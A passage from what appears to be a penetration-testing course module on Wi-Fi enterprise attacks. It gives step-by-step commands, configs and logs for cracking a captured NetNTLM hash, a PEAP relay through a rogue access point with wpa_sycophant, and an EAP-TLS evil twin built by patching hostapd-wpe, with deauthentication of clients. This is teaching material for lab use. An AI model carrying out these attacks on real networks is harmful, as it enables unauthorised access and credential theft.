Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
Hash.Target......: Administrator::::54as56d65asasd55asd564asd564asd55...4d1a2s
Time.Started.....: Day Mon 12 34:56:78 xxxx (0 secs)
Time.Estimated...: Day Mon 12 34:56:78 xxxx (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (wordlist.dict)
Guess.Queue......: 1/10000 (100.00%)
Speed.#1.........:     1733 H/s (0.02ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1/10000 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Wowwhatasecurepassword123 -> Wowwhatasecurepassword123
Hardware.Mon.#1..: Temp: 54c Fan:  0% Util: 29% Core:1882MHz Mem:7300MHz Bus:16

```

If **Hashcat** does not work within the provided attacker VM, it is recommended to use **Pwnbox** or your **local VM** to run Hashcat.

At this stage, we will have obtained the correct password to access our target network or carry out other malicious actions.

However, suppose we are unable to crack the hash due to a strong password. In such a scenario, we can perform a `PEAP relay attack`. This technique lets us relay the captured NTLM hash back to the access point, allowing us to operate as a connected client without requiring the actual password. In the next section, we will explore how to execute this attack.


# PEAP Relay Attack

* * *

In the previous section, we demonstrated how an Evil-Twin Attack can be used to capture the NTLM hash of a client when they are using `CHAP` or `MSCHAP/MSCHAPv2` authentication. However, if the captured hash is too strong to crack due to a robust password, we can instead relay the captured response to the access point. This technique allows us to act on behalf of the client, gaining network access without needing to crack the password. Essentially, the captured NTLM response is forwarded to the access point, enabling us to operate as a connected client. This relay attack was showcased at [DEF CON 26 using MitM with Mana](https://www.youtube.com/watch?v=eYsGyvGxlpI), as well as in the [SensePost](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/) blog.

Within the PEAP security tunnel, the authenticator or access point doesn't distinguish between a legitimate client and an attacker. Therefore, if an attacker relays a captured NTLM response to the access point, the AP will treat the attacker as a legitimate client, granting access without the attacker ever knowing the password.

* * *

## Enumeration

We will need three WLAN interfaces to perform the relay attack. One interface, `wlan0`, will be set to monitor mode for scanning and conducting deauthentication attacks against clients. The second interface, `wlan1`, will be in master mode, hosting our fake access point (Rogue AP) for clients to connect to. Our third interface, `wlan2`, will relay the captured NTLM response to the legitimate access point.

```shell
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan2     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

```

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

Once our interface is in monitor mode, we can use `airodump-ng` to scan for available Wi-Fi networks and their associated clients.

```shell
airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 0 s ][ 2024-08-21 12:04

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28   0       12        2    0   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  3E:DE:2A:E8:58:81  -29    0 - 1      0        1

```

From the output above, we can see that the `HTB-Corp` Wi-Fi network is available with the BSSID `9C:9A:03:39:BD:7A` and a client connected to it with the MAC address `3E:DE:2A:E8:58:81`.

* * *

### Attack Approach

To conduct a PEAP relay attack, we will need to set up the following:

1. `hostapd configuration`
2. `hostapd eapuser configuration`
3. `wpa_sycophant configuration`
4. `Generate certificates for the encrypted tunnel`

Doing so should allow us to pose our rogue access point with extra legitimacy.

* * *

## Performing the Attack

To begin, we will need to generate the necessary certificates to establish an encrypted tunnel.

First, we need to generate a private key for our Certificate Authority (CA).

```shell
openssl genrsa -out ca.key 2048

```

Next, we need to generate a self-signed CA certificate, ensuring that we enter the appropriate information to effectively impersonate the target.

```shell
openssl req -new -x509 -days 365 -key ca.key -out ca.pem

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Francisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:[email protected]

```

Next, we need to generate the private key for our server.

```shell
openssl genrsa -out server.key 2048

```

Then, we need to generate a Certificate Signing Request (CSR) using the server's private key.

```shell
openssl req -new -key server.key -out server.CA.csr

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Fransisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:[email protected]

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:

```

Next, we can generate the Diffie-Hellman parameters for the key exchange.

```shell
openssl dhparam -out dhparam.pem 2048

Generating DH parameters, 2048 bit long safe prime
..........+...............+.........................................................................................................................................................++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*++*

```

Finally, we can sign the server CSR with our CA key and certificate.

```shell
openssl x509 -req -in server.CA.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.pem -days 365

Certificate request self-signature ok
subject=C=US, ST=California, L=San Fransisco, O=Hack The Box, OU=HTB, CN=HTB, [email protected]

```

In summary, to represent a legitimate access point with encrypted tunnels, we need the following files:

1. `ca.pem`
2. `server.pem`
3. `server.key`
4. `dhparam.pem`

Once all our certificates are generated, we can configure `hostapd-mana`. We will need to set up two configuration files:

1. `hostapd.conf:` This file contains the settings for our rogue access point.
2. `hostapd.eapuser:` This file specifies the EAP methods for negotiation when clients connect to our rogue access point.

To get started, we need to create a `hostapd.conf` file with the following contents:

```configuration
# Interface configuration
interface=wlan1
ssid=HTB-Corp
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user
eapol_key_index_workaround=0

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1

# Certificate Configuration
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
dh_file=dhparam.pem

# Sycophant Configuration
enable_sycophant=1
sycophant_dir=/tmp/

```

In the hostapd.conf file, we need to ensure that all settings are configured correctly for our target AP.

- `SSID and Channel`: Verify that these match the target access point.
- `Certificate Files`: Specify the names and locations of the certificate files to ensure the encrypted tunnel functions properly.
- `wpa-sycophant Configuration`: Ensure this feature is enabled to relay authentication messages back to the AP.

Next, to gain refined control over EAP method negotiation between our fake access point and the client, we need to create the `hostapd.eap_user` file (referenced in our `hostapd.conf` file) with the following content:

```configuration
*       PEAP,TTLS,TLS,MD5,GTC
"t"TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP   "challenge1234"[2]

```

Ideally, we configure the client to use `PEAP-MSCHAPv2` first. For downgrade attacks, we may instruct the client to use `TTLS-PAP` or other methods to retrieve cleartext credentials.

We can now bring up our fake access point using `hostapd-mana`.

```shell
hostapd-mana ./hostapd.conf

Configuration file: ./hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
MANA: Sycohpant state directory set to /tmp/.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr 02:21:6a:17:3f:17 and ssid "HTB-Corp"
random: Only 15/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
MANA - Directed probe request for SSID 'HTB-Corp' from 3e:de:2a:e8:58:81

```

Next, we need to configure [wpa-sycophant](https://github.com/sensepost/wpa_sycophant) to relay authentication messages to the legitimate access point. This setup may allow us to establish an active session with the target network.

We need to create a `wpa_sycophant.config` file in the `/opt/wpa_sycophant` folder with the following contents:

```configuration
network={
  ssid="HTB-Corp"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity=""
  anonymous_identity=""
  password=""
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  bssid_blacklist=02:21:6a:17:3f:17
}

```

In the configuration file, we set the SSID to match the target network. Additionally, we add the BSSID (MAC address) of our rogue AP to the blacklist to avoid relaying authentication messages back to ourselves, which would be counterproductive. To obtain the MAC address of our rogue AP, we use the command: `ifconfig wlan1` (as wlan1 is the interface used to host the rogue AP.)

```shell
ifconfig wlan1

wlan1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:21:6a:17:3f:17  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

At this point, we should have all the necessary configurations for our target network complete. We can now start `wpa-sycophant` in a separate terminal and initiate the relay using our `wlan2` interface.

```shell
/opt/wpa_sycophant/wpa_sycophant.sh -c wpa_sycophant.config -i wlan2

SYCOPHANT : RUNNING "./wpa_supplicant/wpa_supplicant -i wlan2 -c wpa_sycophant.config"
SYCOPHANT : RUNNING "dhclient wlan2"
Successfully initialized wpa_sycophant
                                                     _                 _
 __      ___ __   __ _     ___ _   _  ___ ___  _ __ | |__   __ _ _ __ | |_
 \ \ /\ / / '_ \ / _` |   / __| | | |/ __/ _ \| '_ \| '_ \ / _` | '_ \| __|
  \ V  V /| |_) | (_| |   \__ \ |_| | (_| (_) | |_) | | | | (_| | | | | |_
   \_/\_/ | .__/ \__,_|___|___/\__, |\___\___/| .__/|_| |_|\__,_|_| |_|\__|
          |_|        |_____|   |___/          |_|

The most important part is the ascii art - Georg-Christian Pranschke

Set MANA to relay

```

Once our relay server is up and running, we can wait for a client to connect. In some cases, clients may connect due to the MANA beacon attack. If not, we can perform deauthentication attacks in additional terminals to encourage clients to connect to our rogue AP.

```shell
aireplay-ng -0 0 -a 9C:9A:03:39:BD:7A -c 3E:DE:2A:E8:58:81  wlan0mon

20:07:23  Sending 64 directed DeAuth (code 7). STMAC: [3E:DE:2A:E8:58:81] [ 0| 0 ACKs]
20:07:24  Sending 64 directed DeAuth (code 7). STMAC: [3E:DE:2A:E8:58:81] [ 0| 0 ACKs]
20:07:25  Sending 64 directed DeAuth (code 7). STMAC: [3E:DE:2A:E8:58:81] [ 0| 0 ACKs]
20:07:25  Sending 64 directed DeAuth (code 7). STMAC: [3E:DE:2A:E8:58:81] [ 0| 0 ACKs]

```

We only need one client to connect to our network for the attack to be successful. If a client does connect, we can check our hostapd terminal to observe the results.

```shell
MANA EAP Identity Phase 0: HTB\Sentinal.Jr
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: HTB\Sentinal.Jr
MANA EAP EAP-MSCHAPV2 ASLEAP user=Sentinal.Jr | asleap -C b5:13:4f:4e:e1:93:f4:98 -R 32:28:b5:61:21:4b:35:fe:55:bc:61:eb:bd:b2:a1:4b:3f:79:4d:87:e6:88:e3:ff
MANA EAP EAP-MSCHAPV2 JTR | Sentinal.Jr:$NETNTLM$b5134f4ee193f498$3228b561214b35fe55bc61ebbdb2a14b3f794d87e688e3ff:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | Sentinal.Jr::::3228b561214b35fe55bc61ebbdb2a14b3f794d87e688e3ff:b5134f4ee193f498
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): 36 a4 5b a6 05 09 57 4d 77 70 65 6d 1a f3 47 4a

```

We should observe the `identity exchange` and the `wpa-sycophant` handoff in the hostapd terminal. Next, in the second terminal running wpa-sycophant, we should see the relay process in action.

```shell
Set MANA to relay
rfkill: Cannot open RFKILL control device
wlan2: SME: Trying to authenticate with 9c:9a:03:39:bd:7a (SSID='HTB-Corp' freq=2412 MHz)
wlan2: Trying to associate with 9c:9a:03:39:bd:7a (SSID='HTB-Corp' freq=2412 MHz)
wlan2: Associated with 9c:9a:03:39:bd:7a
wlan2: CTRL-EVENT-EAP-STARTED EAP authentication started
SYCOPHANT : Getting Identity
SYCOPHANT : Config phase 1 ident : - hexdump_ascii(len=0):
SYCOPHANT : Phase 1 Identity : - hexdump_ascii(len=15):
     48 54 42 5c 53 65 6e 74 69 6e 61 6c 2e 4a 72      HTB\Sentinal.Jr
wlan2: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan2: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan2: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 25 (PEAP) selected
wlan2: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=US/ST=California/L=San Francisco/O=HTB/CN=htb.com' hash=05d1439b7298ca95dea2686844c3743ddedae9858e8228cf7d6f5f6f788108ed
wlan2: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=US/ST=California/L=San Francisco/O=HTB/CN=htb.com' hash=05d1439b7298ca95dea2686844c3743ddedae9858e8228cf7d6f5f6f788108ed
SYCOPHANT : Getting Identity
SYCOPHANT : Config phase 2 ident : - hexdump_ascii(len=0):
SYCOPHANT : Phase 2 Identity : - hexdump_ascii(len=15):
     48 54 42 5c 53 65 6e 74 69 6e 61 6c 2e 4a 72      HTB\Sentinal.Jr
SYCOPHANT : CHALLANGE DATA - hexdump(len=16): 23 d3 84 c8 c1 fa 4d b2 8b a8 d3 57 9a b5 b6 f1
SYCOPHANT : CHALLANGE DATA GIVEN TO MANA
SYCOPHANT : INFORMING MANA TO SERVE CHALLENGE
SYCOPHANT : RESPONSE SET BY PEER - hexdump(len=74): 02 8c 00 4a 1a 02 8c 00 45 31 ba a3 7f cb 08 2d 1b 65 53 86 0d 29 8b a6 f6 9a 00 00 00 00 00 00 00 00 f0 1b bd 98 85 82 22 f2 0e c7 74 3f 1f 68 3f d6 9b 6a 1f 81 50 4b 61 85 00 31 d6 cf e0 d1 6a e9 31 b7 3c 59 d7 e0 c0 89
SYCOPHANT : ORIG CONTENTS - hexdump(len=74): 02 8c 00 4a 1a 02 8c 00 45 31 ba a3 7f cb 08 2d 1b 65 53 86 0d 29 8b a6 f6 9a 00 00 00 00 00 00 00 00 f0 1b bd 98 85 82 22 f2 0e c7 74 3f 1f 68 3f d6 9b 6a 1f 81 50 4b 61 85 00 31 d6 cf e0 d1 6a e9 31 b7 3c 59 d7 e0 c0 89
SYCOPHANT : MANA CONTENTS - hexdump(len=74): 02 29 00 4a 1a 02 29 00 45 31 ee 69 8a 7a 86 90 e0 40 9a 93 2f 46 61 4a e4 e9 00 00 00 00 00 00 00 00 5b 8f ac b5 0b e6 fa 0f bf f8 0a b1 5f 77 f9 a8 1f e1 a0 7e 22 13 5a 7d 00 48 54 42 5c 53 65 6e 74 69 6e 61 6c 2e 4a 72
SYCOPHANT : ORIG CONTENTS - hexdump(len=74): 02 8c 00 4a 1a 02 8c 00 45 31 ee 69 8a 7a 86 90 e0 40 9a 93 2f 46 61 4a e4 e9 00 00 00 00 00 00 00 00 5b 8f ac b5 0b e6 fa 0f bf f8 0a b1 5f 77 f9 a8 1f e1 a0 7e 22 13 5a 7d 00 48 54 42 5c 53 65 6e 74 69 6e 61 6c 2e 4a 72
SYCOPHANT : MANA CONTENTS - hexdump(len=74): 02 29 00 4a 1a 02 29 00 45 31 ee 69 8a 7a 86 90 e0 40 9a 93 2f 46 61 4a e4 e9 00 00 00 00 00 00 00 00 5b 8f ac b5 0b e6 fa 0f bf f8 0a b1 5f 77 f9 a8 1f e1 a0 7e 22 13 5a 7d 00 48 54 42 5c 53 65 6e 74 69 6e 61 6c 2e 4a 72
EAP-MSCHAPV2: Received success
Response not verified, does not seem important
EAP-MSCHAPV2: Authentication succeeded
wlan2: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan2: PMKSA-CACHE-ADDED 9c:9a:03:39:bd:7a 0
wlan2: WPA: Key negotiation completed with 9c:9a:03:39:bd:7a [PTK=CCMP GTK=CCMP]
wlan2: CTRL-EVENT-CONNECTED - Connection to 9c:9a:03:39:bd:7a completed [id=0 id_str=]

```

Ultimately, we relay each message and calculate the resultant CSK. Doing so allows us to retrieve an active session within a PEAP network, without ever knowing the true password of the user.

To verify if the attack was successful, we can use the `ifconfig` utility to check for a network connection.

```shell
ifconfig wlan2

wlan2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.12  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 06:c7:a6:c7:9e:bf  txqueuelen 1000  (Ethernet)
        RX packets 22  bytes 3284 (3.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 21  bytes 2910 (2.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

If we obtain a valid IP address within the target network, it indicates that our attack has succeeded and we are connected to the network.


# Attacking EAP-TLS Authentication

* * *

EAP-Transport Layer Security (EAP-TLS) is considered one of the most secure authentication methods. It relies on `certificates` for both the server and client, enabling mutual authentication without the need for traditional usernames and passwords. EAP-TLS is the most widely used authentication protocol in WPA2-Enterprise networks, facilitating the use of X.509 digital certificates for secure authentication.

EAP-TLS is widely regarded as the gold standard for network authentication security. However, even with its robust protection, an evil twin attack with a rogue access point is possible if the client does not validate the server certificate.

In many organizations, a CA certificate used to sign the RADIUS server is installed on all client computers through [Group Policy](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11)). To ensure Windows clients don't connect to fake access points, it's essential to have the `"Notifications before connecting"` setting configured to: ["Don't ask user to authorize new servers or trusted CAs"](https://learn.microsoft.com/en-us/windows-server/networking/technologies/extensible-authentication-protocol/network-access?tabs=eap-tls%2Cserveruserprompt-eap-tls%2Ceap-sim#server-validation-user-prompt).

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/eap-tls-notification.png)

If this option is not configured, a victim connecting to the fake access point receives a server certificate from the attacker's authentication server, prompting them to decide whether to accept it. In some cases, the invalid certificate provided by the attacker may be accepted automatically. An attacker typically only needs to target a single improperly configured supplicant (client) to be successful.

* * *

## Enumeration

We will use three WLAN interfaces to perform this attack. One interface, `wlan0`, will be set to monitor mode for scanning and conducting deauthentication attacks against clients. The second interface, `wlan1`, will be in master mode, hosting our fake access point (Rogue AP) for clients to connect to. Our third interface, `wlan2`, will be used to forward traffic to the internet once we receive credentials from clients via captive portal.

```shell
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan2     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

```

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

Once our interface is in monitor mode, we can use `airodump-ng` to scan for available Wi-Fi networks and their associated clients. We can use the argument `-w WPA` to save the output of the capture to a file.

```shell
airodump-ng wlan0mon -c 1 -w WPA

12:36:17  Created capture file "WPA-01.cap".

 CH  1 ][ Elapsed: 2 mins ][ 2024-08-28 12:38 ][ WPA handshake: 9C:9A:03:39:BD:7A

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28 100     1171       87    2   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  2E:18:CB:2D:7D:9F  -29    1 -48      0     1384  PMKID  HTB-Corp

```

To capture the complete EAP handshake, we can deauthenticate the client (provided that PMK caching is disabled).

```shell
sudo aireplay-ng -0 10 -a 9C:9A:03:39:BD:7A -c 2E:18:CB:2D:7D:9F wlan0mon

12:36:20  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
12:36:20  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:21  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:21  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:22  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:22  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:23  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:24  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:24  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:25  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:25  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]

```

Once the handshake is captured, we can use Wireshark with the filter `eap` to analyze the authentication type.

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/eap-tls-wireshark.png)

From the Wireshark output, we can observe that the client uses `EAP-TLS`, a certificate-based authentication method known for its high security.

* * *

## Performing the Attack

`Hostapd-wpe` is a versatile utility to consider when attacking WPA/WPA2 Enterprise networks. It does most of the configuration for us, with little interference.

To begin, we will want to make a copy of our configuration file for `Hostapd-wpe`. We do so by employing the following command:

```shell
cp /etc/hostapd-wpe/hostapd-wpe.conf hostapd-wpe.conf

```

```shell
ls

hostapd-wpe.conf

```

Next, we need to modify specific sections of our `hostapd-wpe.conf` configuration file to ensure the tool functions as desired. We need to change the interface to `wlan1`, set the SSID to `HTB-Corp`, and configure the channel to `1`.

```configuration
interface=wlan1
ssid=HTB-Corp
channel=1

```

Once our interface is configured and our `hostapd-wpe.conf` configuration file is properly set up, we can start our fake access point using the following command:

```shell
hostapd-wpe hostapd-wpe.conf

rfkill: Cannot open RFKILL control device
random: Only 15/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED

```

If everything is set up correctly, our access point should be operational and ready to capture credentials from client devices. If, after some time, connected clients do not automatically switch to our network due to the KARMA attack, and they remain associated with the original access point, we may need to perform a `deauthentication attack`. This will disconnect clients from the target access point, encouraging them to connect to our fake AP. We can execute this attack using `aireplay-ng` as shown in the following command, providing the target access point's BSSID and the client’s MAC address.

```shell
sudo aireplay-ng -0 3 -a 9C:9A:03:39:BD:7A -c 2E:18:CB:2D:7D:9F wlan0mon

12:36:20  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
12:36:20  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:21  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]
12:36:21  Sending 64 directed DeAuth (code 7). STMAC: [2E:18:CB:2D:7D:9F] [ 0| 0 ACKs]

```

```shell
wlan1: AP-ENABLED
wlan1: STA 2e:18:cb:2d:7d:9f IEEE 802.11: authenticated
wlan1: STA 2e:18:cb:2d:7d:9f IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 2e:18:cb:2d:7d:9f
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=13
TLS: Certificate verification failed, error 20 (unable to get local issuer certificate) depth 0 for '/C=US/ST=California/L=San Fransisco/O=Hack The Box/OU=HTB/CN=HTB/[email protected]'
authsrv: certificate chain failure: reason=1 depth=0 subject='/C=US/ST=California/L=San Fransisco/O=Hack The Box/OU=HTB/CN=HTB/[email protected]' err='unable to get local issuer certificate'
SSL: SSL3 alert: write (local SSL3 detected an error):fatal:unknown CA
OpenSSL: openssl_handshake - SSL_connect error:14089086:SSL routines:ssl3_get_client_certificate:certificate verify failed
wlan1: CTRL-EVENT-EAP-FAILURE 2e:18:cb:2d:7d:9f
wlan1: STA 2e:18:cb:2d:7d:9f IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan1: STA 2e:18:cb:2d:7d:9f IEEE 802.1X: Supplicant used different EAP type: 13 (TLS)
wlan1: STA 2e:18:cb:2d:7d:9f IEEE 802.11: deauthenticated due to local deauth request

```

The above error message `TLS: Certificate verification failed, error 20 (unable to get local issuer certificate)` indicates that our rogue access point (AP) rejected the client's certificate because it was signed by an unrecognized Certificate Authority (CA). While this error can be resolved by modifying the configuration, it also serves as a significant finding. It demonstrates that even when clients are configured to use `EAP-TLS` certificate-based authentication, which is secure by design, they are still attempting to connect to our fake AP. This suggests a potential vulnerability in the client configuration. Specifically, it fails to properly validate the server's certificate before initiating the connection, which could be exploited in certain attack scenarios.

To bypass this issue, we can modify the hostapd-wpe code to accept the client's certificate, even if it's signed by an unknown CA, and then recompile it. For detailed instructions on how this was found in a real engagement, you can refer to this blog post: [EAP-TLS Wireless Infrastructure](https://versprite.com/blog/eap-tls-wireless-infrastructure/). This modification allows our rogue AP to authenticate the client, overcoming the SSL error.

To recompile `hostapd-wpe` with modification, we'll first need to apply the hostapd-wpe patch to the hostapd-2.6 source code. We can use the following command to do so.

```shell
cd /opt/hostapd-2.6 && patch -p1 < ../hostapd-wpe/hostapd-wpe.patch

patching file hostapd/.config
patching file hostapd/config_file.c
patching file hostapd/hostapd-wpe.conf
patching file hostapd/hostapd-wpe.conf.bak
patching file hostapd/hostapd-wpe.eap_user
patching file hostapd/hostapd-wpe.log
patching file hostapd/main.c
patching file hostapd/Makefile
patching file src/ap/beacon.c
patching file src/ap/ieee802_11.c
patching file src/crypto/ms_funcs.h
patching file src/crypto/tls_openssl.c
patching file src/eap_server/eap_server.c
patching file src/eap_server/eap_server_mschapv2.c
patching file src/eap_server/eap_server_peap.c
patching file src/eap_server/eap_server_ttls.c
patching file src/Makefile
patching file src/utils/wpa_debug.c
patching file src/wpe/Makefile
patching file src/wpe/wpe.c
patching file src/wpe/wpe.h

```

To proceed with the hostapd-wpe setup, we'll need to edit the `eap_server_tls.c` file in the hostapd-2.6 source code. Let's open the file `/opt/hostapd-2.6/src/eap_server/eap_server_tls.c` and navigate to line 80, where we should find the code that looks something like this:

```
        if (eap_server_tls_ssl_init(sm, &data->ssl, 1, EAP_TYPE_TLS)) {

```

We need to change the `1` to `0` to disable the client certificate verification:

```
        if (eap_server_tls_ssl_init(sm, &data->ssl, 0, EAP_TYPE_TLS)) {

```

After making this change, we can proceed to recompile `hostapd` with the updated configuration.

```shell
cd /opt/hostapd-2.6/hostapd &&  make

  CC  main.c
  CC  config_file.c
  CC  ../src/ap/hostapd.c
  CC  ../src/ap/wpa_auth_glue.c
  CC  ../src/ap/drv_callbacks.c
  CC  ../src/ap/ap_drv_ops.c
  <SNIP>
  LD  hostapd-wpe
  CC  hostapd_cli.c
